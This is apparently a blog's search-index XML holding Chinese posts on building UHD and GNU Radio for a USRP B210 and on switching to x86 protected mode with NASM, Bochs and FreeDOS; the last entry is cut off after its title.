<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2019-7-4-usrpb210环境搭建</title>
      <link href="/passages/2019-7-4-usrpb210%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/passages/2019-7-4-usrpb210%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>#usrp b210的环境搭建<br>我的环境VM14+ubuntu16.04虚拟机<br>官方文档：<a href="https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_(UHD_and_GNU_Radio)_on_Linux" target="_blank" rel="noopener">https://kb.ettus.com/Building_and_Installing_the_USRP_Open-Source_Toolchain_(UHD_and_GNU_Radio)_on_Linux</a></p><p>##1、UHD和GNURADIO驱动安装<br>更新源<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure></p><p>安装UHD和GNURADIO的必要环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install git swig cmake doxygen build-essential libboost-all-dev libtool libusb-1.0-0 libusb-1.0-0-dev libudev-dev libncurses5-dev libfftw3-bin libfftw3-dev libfftw3-doc libcppunit-1.13-0v5 libcppunit-dev libcppunit-doc ncurses-bin cpufrequtils python-numpy python-numpy-doc python-numpy-dbg python-scipy python-docutils qt4-bin-dbg qt4-default qt4-doc libqt4-dev libqt4-dev-bin python-qt4 python-qt4-dbg python-qt4-dev python-qt4-doc python-qt4-doc libqwt6abi1 libfftw3-bin libfftw3-dev libfftw3-doc ncurses-bin libncurses5 libncurses5-dev libncurses5-dbg libfontconfig1-dev libxrender-dev libpulse-dev swig g++ automake autoconf libtool python-dev libfftw3-dev libcppunit-dev libboost-all-dev libusb-dev libusb-1.0-0-dev fort77 libsdl1.2-dev python-wxgtk3.0 git-core libqt4-dev python-numpy ccache python-opengl libgsl-dev python-cheetah python-mako python-lxml doxygen qt4-default qt4-dev-tools libusb-1.0-0-dev libqwt5-qt4-dev libqwtplot3d-qt4-dev pyqt4-dev-tools python-qwt5-qt4 cmake git-core wget libxi-dev gtk2-engines-pixbuf r-base-dev python-tk liborc-0.4-0 liborc-0.4-dev libasound2-dev python-gtk2 libzmq-dev libzmq1 python-requests python-sphinx libcomedi-dev python-zmq python-setuptools</span><br></pre></td></tr></table></figure></p><p>到这一步都顺利安装，接着便是安装UHD<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir workarea-uhd</span><br><span class="line">cd workarea-uhd</span><br><span class="line">git clone https://github.com/EttusResearch/uhd ;这里尝试了代理，但是速度依旧只有几K，而且中途容易下载失败，多次失败后发现是公司网络的问题</span><br><span class="line">cd uhd</span><br></pre></td></tr></table></figure></p><p>Next, checkout the desired UHD version. You can get a full listing of tagged releases by running the command:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -l</span><br></pre></td></tr></table></figure></p><p>Example truncated output of git tag -l:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git tag -l</span><br><span class="line">...</span><br><span class="line">release_003_009_004</span><br><span class="line">release_003_009_005</span><br><span class="line">release_003_010_000_000</span><br></pre></td></tr></table></figure></p><p>Note: As of UHD Version 3.10.0.0, the versioning scheme has changed to be a quadruplet format. Each element and version will follow the format of: Major.API.ABI.Patch. Additional details on this versioning change can be found here.</p><p>After identifying the version and corresponding release tag you need, check it out:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Example: For UHD 3.9.5:</span><br><span class="line">git checkout release_003_009_005</span><br><span class="line"># Example: For UHD 3.14.0.0</span><br><span class="line">git checkout v3.14.0.0</span><br></pre></td></tr></table></figure></p><p>Next, create a build folder within the repository.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd host</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure></p><p>Next, invoke CMake to create the Makefiles.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake ../</span><br></pre></td></tr></table></figure></p><p>Next, run Make to build UHD.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make;这一步大概耗时一个多小时，最后98%的时候因为虚拟机内存过小失败了，把内存从1G调整成2G后就成功make了</span><br></pre></td></tr></table></figure></p><p>Next, you can optionally run some basic tests to verify that the build process completed properly.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make test</span><br></pre></td></tr></table></figure></p><p>Next, install UHD, using the default install prefix, which will install UHD under the /usr/local/lib folder. You need to run this as root due to the permissions on that folder.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure></p><p>Next, update the system’s shared library cache.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure></p><p>Finally, make sure that the LD_LIBRARY_PATH environment variable is defined and includes the folder under which UHD was installed. Most commonly, you can add the line below to the end of your $HOME/.bashrc file:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=/usr/local/lib</span><br></pre></td></tr></table></figure></p><p>If the LD_LIBRARY_PATH environment variable is already defined with other folders in your $HOME/.bashrc file, then add the line below to the end of your $HOME/.bashrc file to preserve the current settings.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib</span><br></pre></td></tr></table></figure></p><p>For this change to take effect, you will need to close the current terminal window, and open a new terminal.</p><p>At this point, UHD should be installed and ready to use. You can quickly test this, with no USRP device attached, by running uhd_find_devices. You should see something similar to the following.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux; GNU C++ version 4.8.4; Boost_105400; UHD_003.010.000.HEAD-0-g6e1ac3fc</span><br><span class="line"></span><br><span class="line">No UHD Devices Found</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-7-4-usrpb210/1.png" alt="avatar"><br>至此UHD安装完成</p><p>接下来就是安装GNU<br>First, make a folder to hold the repository.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir workarea-gnuradio</span><br><span class="line">cd workarea-gnuradio</span><br></pre></td></tr></table></figure></p><p>Next, clone the repository.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/gnuradio/gnuradio</span><br></pre></td></tr></table></figure></p><p>Next, go into the repository and check out the desired GNU Radio version.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd gnuradio</span><br></pre></td></tr></table></figure></p><p>To checkout the v3.7.13.4 branch:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout v3.7.13.4</span><br></pre></td></tr></table></figure></p><p>Or to checkout the maint-3.7 branch:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout maint-3.7</span><br></pre></td></tr></table></figure></p><p>Next, update the submodules:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule update --init --recursive;这里出现了Submodule path &apos;volk&apos;: checked out，不知道什么原因，但似乎不影响之后的步骤</span><br></pre></td></tr></table></figure></p><p>Next, create a build folder within the repository.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure></p><p>Next, invoke CMake to create the Makefiles.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake ../</span><br></pre></td></tr></table></figure></p><p>Next, run Make to build GNU Radio.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure></p><p>Next, you can optionally run some basic tests to verify that the build process completed properly.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make test</span><br></pre></td></tr></table></figure></p><p>Next, install GNU Radio, using the default install prefix, which will install GNU Radio under the /usr/local/lib folder. You need to run this as root due to the permissions on that folder.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure></p><p>Finally, update the system’s shared library cache.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure></p><p>At this point, GNU Radio should be installed and ready to use. You can quickly test this, with no USRP device attached, by running the following quick tests.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-config-info --version</span><br><span class="line">gnuradio-config-info --prefix</span><br><span class="line">gnuradio-config-info --enabled-components</span><br></pre></td></tr></table></figure></p><p>There is a simple flowgraph that you can run that does not require any USRP hardware. It’s called the dialtone test, and it produces a PSTN dial tone on the computer’s speakers. Running it verifies that all the libraries can be found, and that the GNU Radio run-time is working.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python $HOME/workarea-gnuradio/gnuradio/gr-audio/examples/python/dial_tone.py</span><br></pre></td></tr></table></figure></p><p>You can try launching the GNU Radio Companion (GRC) tool, a visual tool for building and running GNU Radio flowgraphs.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure></p><p>If “gnuradio-companion” does not start and complains about the PYTHONPATH environment variable, then you may have to set this in your $HOME/.bashrc file, as shown below.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PYTHONPATH=/usr/local/lib/python2.7/dist-packages</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-7-4-usrpb210/2.jpg" alt="avatar"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-5-29-自己动手写操作系统(3)</title>
      <link href="/passages/2019-5-29-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(3)/"/>
      <url>/passages/2019-5-29-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(3)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>一边自己写简易的操作系统，一边阅读《程序员的自我修养》了解操作系统，越发地体会到操作系统的复杂。今天为了之后实验更方便地进行调试，还需要安装一个X86的dos。</p><h1 id="第一步：配置freedos"><a href="#第一步：配置freedos" class="headerlink" title="第一步：配置freedos"></a>第一步：配置freedos</h1><h2 id="1、下载freedos"><a href="#1、下载freedos" class="headerlink" title="1、下载freedos"></a>1、下载freedos</h2><p>在<a href="http://bochs.sourceforge.net/guestos/freedos-img.tar.gz上面下载FreeDos" target="_blank" rel="noopener">http://bochs.sourceforge.net/guestos/freedos-img.tar.gz上面下载FreeDos</a></p><h2 id="2、创建镜像"><a href="#2、创建镜像" class="headerlink" title="2、创建镜像"></a>2、创建镜像</h2><p>bochs可以通过bximage命令快捷地创建镜像<br><img src="/images/minisystem/2019-5-29-section3-1.png" alt="avatar"><br>其中红框部分就是要需要输入的，分别是选择功能、选择创建硬盘(hd)还是软盘(fd)镜像、设置软盘镜像大小、命名(pm.img)。<br>随后将下载好的freedos解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar vxzf freedos-img.tar.gz</span><br></pre></td></tr></table></figure></p><p>将解压得到的a.img改名成freedos.img，和上一步创建的pm.img放在同一个工作目录下<br>之后可以将freedos解压文件中的bochsrc直接复制到该文件，然后修改部分配置选项<br><img src="/images/minisystem/2019-5-29-section3-2.png" alt="avatar"><br>接着启动bochs<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bochs  -f  bochsrc</span><br></pre></td></tr></table></figure></p><p>启动后格式化b盘，然后退出bochs<br><img src="/images/minisystem/2019-5-29-section3-3.png" alt="avatar"></p><h1 id="第二步：编译pmtest1-asm"><a href="#第二步：编译pmtest1-asm" class="headerlink" title="第二步：编译pmtest1.asm"></a>第二步：编译pmtest1.asm</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">;=========================================</span><br><span class="line">;pmtest1.asm</span><br><span class="line">;编译方法: nasm pmtest1.asm -o pmtest1.com</span><br><span class="line">;=========================================</span><br><span class="line">%include &quot;pm.inc&quot;;常量、宏，以及一些说明</span><br><span class="line">org 0100h</span><br><span class="line">jmp LABEL_BEGIN</span><br><span class="line"></span><br><span class="line">[SECTION .gdt]</span><br><span class="line">; GDT</span><br><span class="line">LABEL_GDT:Descriptor 0, 0, 0;空描述符</span><br><span class="line">LABEL_DESC_CODE32:Descriptor 0, SegCode32Len - 1, DA_C + DA_32</span><br><span class="line">;代码段，32位</span><br><span class="line">LABEL_DESC_VIDEO:Descriptor 0B8000h, 0ffffh, DA_DRW</span><br><span class="line">;显存首地址</span><br><span class="line">;GDT结束</span><br><span class="line"></span><br><span class="line">GdtLenequ $ - LABEL_GDT;GDT长度</span><br><span class="line">GdtPtrdw  GdtLen;GDT界限</span><br><span class="line">dd  0;GDT基地址</span><br><span class="line"></span><br><span class="line">;GDT选择子</span><br><span class="line">SelectorCode32equ LABEL_DESC_CODE32 - LABEL_GDT</span><br><span class="line">SelectorVideoequ LABEL_DESC_VIDEO  - LABEL_GDT</span><br><span class="line">;END of [SECTION .gdt]</span><br><span class="line">[SECTION .s16] </span><br><span class="line">[BITS 16]</span><br><span class="line">LABEL_BEGIN:</span><br><span class="line">mov ax, cs</span><br><span class="line">mov ds, ax</span><br><span class="line">mov es, ax </span><br><span class="line">mov ss, ax</span><br><span class="line">mov sp, 0100h</span><br><span class="line"></span><br><span class="line">;初始化32位代码段描述符</span><br><span class="line">xor eax, eax</span><br><span class="line">mov ax,  cs</span><br><span class="line">shl eax, 4</span><br><span class="line">add eax, LABEL_SEG_CODE32</span><br><span class="line">mov word [LABEL_DESC_CODE32 + 2], ax</span><br><span class="line">shr eax, 16</span><br><span class="line">mov byte [LABEL_DESC_CODE32 + 4], al</span><br><span class="line">mov byte [LABEL_DESC_CODE32 + 7], ah</span><br><span class="line"></span><br><span class="line">;为加载gdtr做准备</span><br><span class="line">xor eax, eax</span><br><span class="line">mov ax,  ds</span><br><span class="line">shl eax, 4</span><br><span class="line">add eax, LABEL_GDT</span><br><span class="line">mov dword [GdtPtr + 2], eax</span><br><span class="line"></span><br><span class="line">;加载gdtr</span><br><span class="line">lgdt [GdtPtr]</span><br><span class="line"></span><br><span class="line">;关中断</span><br><span class="line">cli</span><br><span class="line"></span><br><span class="line">;打开地址线A20</span><br><span class="line">in  al, 92h</span><br><span class="line">or  al, 00000010b</span><br><span class="line">out 92h, al</span><br><span class="line"></span><br><span class="line">;准备切换到保护模式</span><br><span class="line">mov eax, cr0</span><br><span class="line">or  eax, 1</span><br><span class="line">mov cr0, eax</span><br><span class="line"></span><br><span class="line">;真正进入保护方式</span><br><span class="line">jmp dword SelectorCode32:0;执行这一句会把SelectorCode32装入cs,并跳转到SelectorCode32:0处</span><br><span class="line"></span><br><span class="line">[SECTION .32]; 32位代码段,由实模式跳入</span><br><span class="line">[BITS 32]</span><br><span class="line"></span><br><span class="line">LABEL_SEG_CODE32:</span><br><span class="line">mov ax, SelectorVideo</span><br><span class="line">mov gs, ax;视频段选择子(目的)</span><br><span class="line">mov edi, (80 * 10 + 0) * 2;屏幕第10行,第0列</span><br><span class="line">mov ah, 0ch;0000:黑底1100:红字</span><br><span class="line">mov al, &apos;P&apos;</span><br><span class="line">mov [gs:edi], ax</span><br><span class="line"></span><br><span class="line">;到此为止</span><br><span class="line"></span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">SegCode32Lenequ $ - LABEL_SEG_CODE32</span><br><span class="line">;END of [SECTION .s32]</span><br></pre></td></tr></table></figure><p>另外还要准备pm.inc(代码来源<a href="https://blog.csdn.net/jltxgcy/article/details/8656101" target="_blank" rel="noopener">https://blog.csdn.net/jltxgcy/article/details/8656101</a>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">; 描述符类型值说明</span><br><span class="line">; 其中:</span><br><span class="line">;       DA_  : Descriptor Attribute</span><br><span class="line">;       D    : 数据段</span><br><span class="line">;       C    : 代码段</span><br><span class="line">;       S    : 系统段</span><br><span class="line">;       R    : 只读</span><br><span class="line">;       RW   : 读写</span><br><span class="line">;       A    : 已访问</span><br><span class="line">;       其它 : 可按照字面意思理解</span><br><span class="line">;G D 0 AVL 0 0 0 0 P DPL(2位) DT TYPE(4位)</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">DA_32EQU4000h; 32 位段 0100 0000 0000 0000</span><br><span class="line"></span><br><span class="line">DA_DPL0EQU00h; DPL = 0 0000 0000</span><br><span class="line">DA_DPL1EQU20h; DPL = 1 0010 0000</span><br><span class="line">DA_DPL2EQU40h; DPL = 2 0100 0000</span><br><span class="line">DA_DPL3EQU60h; DPL = 3 0110 0000</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">; 存储段描述符类型值说明</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">DA_DREQU90h; 存在的只读数据段类型值  1001 0000</span><br><span class="line">DA_DRWEQU92h; 存在的可读写数据段属性值 1001 0010</span><br><span class="line">DA_DRWAEQU93h; 存在的已访问可读写数据段类型值 1001 0011</span><br><span class="line">DA_CEQU98h; 存在的只执行代码段属性值 1001 1000</span><br><span class="line">DA_CREQU9Ah; 存在的可执行可读代码段属性值 1001 1010</span><br><span class="line">DA_CCOEQU9Ch; 存在的只执行一致代码段属性值 1001 1100</span><br><span class="line">DA_CCOREQU9Eh; 存在的可执行可读一致代码段属性值 1001 1110</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">; 系统段描述符类型值说明</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">DA_LDTEQU82h; 局部描述符表段类型值 1000 0010</span><br><span class="line">DA_TaskGateEQU85h; 任务门类型值 1000 0101</span><br><span class="line">DA_386TSSEQU89h; 可用 386 任务状态段类型值 1000 1001</span><br><span class="line">DA_386CGateEQU8Ch; 386 调用门类型值 1000 1100</span><br><span class="line">DA_386IGateEQU8Eh; 386 中断门类型值 1000 1110</span><br><span class="line">DA_386TGateEQU8Fh; 386 陷阱门类型值 1000 1111</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line">; 选择子类型值说明</span><br><span class="line">; 其中:</span><br><span class="line">;       SA_  : Selector Attribute</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SA_RPL0EQU0; ┓00</span><br><span class="line">SA_RPL1EQU1; ┣RPL01</span><br><span class="line">SA_RPL2EQU2; ┃10</span><br><span class="line">SA_RPL3EQU3; ┛11</span><br><span class="line"></span><br><span class="line">SA_TIGEQU0; ┓TI 0000</span><br><span class="line">SA_TILEQU4; ┛  0100</span><br><span class="line">;----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;宏----------------------------------------------------------------------------------------</span><br><span class="line">;</span><br><span class="line">; 描述符</span><br><span class="line">; usage: Descriptor Base, Limit, Attr</span><br><span class="line">;        Base:  dd</span><br><span class="line">;        Limit: dd (low 20 bits available)低二十位可用</span><br><span class="line">;        Attr:  dw (lower 4 bits of higher byte are always 0)高字节的低四位始终为0</span><br><span class="line">%macroDescriptor 3 ;段界限为低地址 1代表Base 2代表Limit 3代表属性 </span><br><span class="line">dw%2 &amp; 0FFFFh; 段界限 1(2 字节)</span><br><span class="line">dw%1 &amp; 0FFFFh; 段首地址 1(2 字节)</span><br><span class="line">db(%1 &gt;&gt; 16) &amp; 0FFh; 段首地址 2(1 字节)</span><br><span class="line">dw((%2 &gt;&gt; 8) &amp; 0F00h) | (%3 &amp; 0F0FFh)</span><br><span class="line">; 属性 1 + 段界限 2 + 属性 2(2 字节)</span><br><span class="line">db(%1 &gt;&gt; 24) &amp; 0FFh; 段首地址 3(1 字节)</span><br><span class="line">%endmacro ; 共 8 字节</span><br><span class="line">;</span><br><span class="line">; 门</span><br><span class="line">; usage: Gate Selector, Offset, DCount, Attr</span><br><span class="line">;        Selector:  dw</span><br><span class="line">;        Offset:    dd</span><br><span class="line">;        DCount:    db</span><br><span class="line">;        Attr:      db</span><br><span class="line">%macro Gate 4 ;1代表Selector 2代表Offset 3代表DCount 4代表Attr</span><br><span class="line">dw(%2 &amp; 0FFFFh); 偏移 1(2 字节)</span><br><span class="line">dw%1; 选择子(2 字节)</span><br><span class="line">dw(%3 &amp; 1Fh) | ((%4 &lt;&lt; 8) &amp; 0FF00h); 属性(2 字节)</span><br><span class="line">dw((%2 &gt;&gt; 16) &amp; 0FFFFh); 偏移 2(2 字节)</span><br><span class="line">%endmacro ; 共 8 字节</span><br></pre></td></tr></table></figure></p><p>最后编译pmtest1.com<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm pmtest1.asm -o pmtest1.com</span><br></pre></td></tr></table></figure></p><p>#第三步：在freedos中运行pmtest1.com<br>这里可以用linux下的mount命令，在mnt目录下创建一个文件，然后和pm.img关联<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /mnt/floppy</span><br><span class="line"></span><br><span class="line">sudo mount -o loop pm.img /mnt/floppy</span><br><span class="line"></span><br><span class="line">sudo cp pmtest1.com /mnt/floppy</span><br><span class="line"></span><br><span class="line">sudo umount /mnt/floppy</span><br></pre></td></tr></table></figure></p><p>运行freedos，在b盘可以看到出现了pmtest1.com<br><img src="/images/minisystem/2019-5-29-section3-4.png" alt="avatar"><br>然后输入pmtest1.com就可以运行了<br><img src="/images/minisystem/2019-5-29-section3-5.png" alt="avatar"><br>屏幕出现了一个红色P，说明pmtest运行成功</p><p>参考自<a href="https://blog.csdn.net/yudale/article/details/68500536" target="_blank" rel="noopener">https://blog.csdn.net/yudale/article/details/68500536</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-5-28-自己动手写操作系统(2)</title>
      <link href="/passages/2019-5-28-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(2)/"/>
      <url>/passages/2019-5-28-%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F(2)/</url>
      
